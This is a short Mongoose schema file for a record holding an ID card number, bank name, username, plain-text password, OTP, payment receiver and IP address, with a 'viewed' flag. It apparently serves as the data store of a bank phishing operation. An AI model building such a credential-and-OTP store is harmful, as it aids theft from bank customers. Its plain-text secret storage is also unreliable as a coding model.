var mongoose = require("mongoose");
var Schema = mongoose.Schema;
var InFo = new Schema({
    CMND:String,
    Bank:String,
    UserName:{
        type:String,
        default:""
    },
    Password:{
        type:String,
        default:""
    },
    ReciverMoney: {
        type:String
    },
    OTP:{
        type:String,
        default:"0"
    },
    Createat:{
        type:Date,
        default:Date.now,
        timezone: 'Asia/Jakarta'
    }
    ,
    status:{
        type:Boolean,
        default:false
    },
    IP:String,
    isView:{
        type:Boolean,
        default:false
    }
})
module.exports = mongoose.model("InFomation",InFo);